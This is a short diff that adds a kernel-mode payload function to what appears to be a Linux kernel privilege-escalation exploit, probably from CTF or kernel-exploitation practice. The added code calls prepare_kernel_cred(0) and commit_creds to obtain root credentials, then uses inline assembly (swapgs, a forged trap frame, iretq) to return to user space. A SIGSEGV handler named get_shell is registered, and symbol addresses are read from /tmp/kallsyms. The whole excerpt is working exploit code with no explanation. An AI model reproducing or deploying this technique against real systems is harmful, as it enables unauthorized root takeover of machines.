@@ -82,6 +82,20 @@ void get_pkc_cc_addr(char *sympath){
     printf("[get_pkc_cc_addr]\nprepare_kernel_cred : %llx\ncommit_creds : %llx\n\n", PKC_ADDR, CC_ADDR);
 }
 
+void payload(){
+    char *(*pkc)(uint64_t) = PKC_ADDR;
+    void (*cc)(char *) = CC_ADDR;
+    (*cc)((*pkc)(0));
+    TrapFrame* trap_frame_addr = &trap_frame;
+    asm volatile("swapgs;"
+        "movq %0, %%rsp;"
+        "iretq;"
+        : 
+        :"r"(trap_frame_addr)
+        :
+    );
+}
+
 int main(){
     signal(SIGSEGV, get_shell);
     get_pkc_cc_addr("/tmp/kallsyms");
